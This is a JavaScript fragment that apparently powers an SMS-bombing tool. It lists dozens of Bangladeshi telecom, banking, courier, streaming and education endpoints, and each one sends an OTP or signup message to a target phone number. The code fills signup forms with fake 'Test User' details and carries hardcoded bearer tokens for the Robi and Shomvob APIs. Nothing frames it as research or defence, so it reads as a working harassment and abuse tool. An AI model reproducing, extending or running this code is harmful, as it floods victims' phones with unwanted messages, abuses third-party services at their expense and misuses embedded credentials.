  ...
  return [
    {
      ...
      fn: async () => {
        await callApi("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {
          ...
          body: JSON.stringify({ full_name: "Test User", company_name: "Test Co", email_address: "test@email.com", phone_number: p }),
        });
      },
    },
    {
      name: "Ghoori",
      fn: async () => {
        await callApi("https://api.ghoorilearning.com/api/auth/signup/otp", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobile_no: p }),
        });
      },
    },
    {
      ...
      fn: async () => {
        await callApi("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ data: { country_calling_code: "88", contact_no: p } }),
        });
      },
    },
    {
      ...
      fn: async () => {
        await callApi("https://api-gateway.sundarbancourierltd.com/graphql", {
          ...
          body: JSON.stringify({
            ...
            variables: { accessTokenFilter: { userName: p } },
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://webapi.robi.com.bd/v1/send-otp", {
          method: "POST",
          headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc" },
    ...
    },
    {
      name: "Banglalink",
      fn: async () => {
        await callApi("https://web-api.banglalink.net/api/v1/user/number/validation/" + p);
      },
    },
    {
      name: "Banglalink OTP",
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://webapi.robi.com.bd/v1/send-otp", {
          method: "POST",
          headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI" },
          body: JSON.stringify({ phone_number: p, type: "my_offer" }),
        });
      },
    },
    {
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://webapi.robi.com.bd/v1/chat/send-otp", {
          method: "POST",
          headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI" },
          body: JSON.stringify({ phone_number: p, name: "Test User", type: "video-chat" }),
        });
      },
    },
    {
    ...
    },
    {
      name: "Fundesh",
      fn: async () => {
        await callApi("https://fundesh.com.bd/api/auth/generateOTP", {
          method: "POST",
    ...
    },
    {
      name: "Bikroy",
      fn: async () => {
        await callApi("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + p);
      },
    },
    {
      name: "MotionView",
    ...
    },
    {
      name: "ChinaOnline",
      fn: async () => {
        await callApi("https://chinaonlinebd.com/api/login/getOtp?phone=" + p);
      },
    },
    {
      name: "Deepto",
      fn: async () => {
        await callApi("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ number: pp88 }),
        });
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://api.shikho.com/auth/v2/send/sms", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p, type: "student", auth_type: "signup", vendor: "shikho" }),
        });
      },
    },
    {
      ...
      fn: async () => {
        await callApi("https://api.redx.com.bd/v1/user/signup", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ name: "Test User", phoneNumber: p, service: "redx" }),
        });
      },
    },
    {
      name: "Bioscope",
      fn: async () => {
        await callApi("https://www.bioscopelive.com/en/login/send-otp?phone=88" + p + "&operator=bd-otp", { method: "POST" });
      },
    },
    {
      name: "Binge",
      fn: async () => {
        await callApi("https://ss.binge.buzz/otp/send/login" + p, { method: "POST" });
      },
    },
    {
      name: "AppLink",
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://chokrojan.com/api/v1/passenger/login/mobile", {
          ...
          body: JSON.stringify({ mobile_number: p }),
        });
      },
    },
    {
      ...
      fn: async () => {
        await callApi("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobileNo: p, product_id: "250", requestChannel: "MOB", trackingStatus: 5 }),
        });
      },
    },
    {
      ...
      fn: async () => {
        await callApi("https://core.easy.com.bd/api/v1/registration", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ name: "Test User", email: "test@email.com", mobile: p, password: "pass123", password_confirmation: "pass123", device_key: "test123" }),
        });
      },
    },
    {
      ...
      fn: async () => {
        await callApi("https://eshop-api.banglalink.net/api/v1/customer/send-otp", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ type: "phone", phone: p }),
        });
      },
    },
    {
      ...
      fn: async () => {
        await callApi("https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobileNo: p, product_id: "122", requestChannel: "MOB", trackingStatus: 5 }),
        });
      },
    },
    {
      name: "MyGP",
      fn: async () => {
        await callApi("https://api.mygp.cinematic.mobi/api/v1/otp/88" + p + "/SBENT_3GB7D", {
          method: "POST",
          headers: { "content-type": "application/json" },
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p, email: "", language: "en" }),
        });
      },
    },
    {
      name: "Hishabee",
      fn: async () => {
        await callApi("https://app.hishabee.business/api/V2/otp/send?mobile_number=" + p, { method: "POST" });
      },
    },
    {
      name: "Iqra",
      fn: async () => {
        await callApi("http://apibeta.iqra-live.com/api/v1/sent-otp/" + p);
      },
    },
    {
      name: "Robi Smart",
      fn: async () => {
        const num = p.replace(/^0/, "");
        await callApi("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ cli: num }),
        });
      },
    },
    {
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://mithaibd.com/api/login/", {
          ...
          body: JSON.stringify({ phone: p, email: `test${p}@gmail.com`, password1: "Pass123@", password2: "Pass123@", company_id: "2", storefront_id: "5" }),
        });
      },
    },
    {
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://api.osudpotro.com/api/v1/users/send_otp", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobile: "+88-" + p, deviceToken: "app", language: "bn", os: "android" }),
        });
      },
    },
    {
      name: "MyGP Login",
      fn: async () => {
        await callApi("https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88" + p + "&lang=en");
      },
    },
    {
      name: "Qcoom",
    ...
    },
    {
      ...
      fn: async () => {
        await callApi("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", {
          method: "POST",
          headers: { "content-type": "application/json", Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" },
          body: JSON.stringify({ phone: p }),
        });
      },
    },
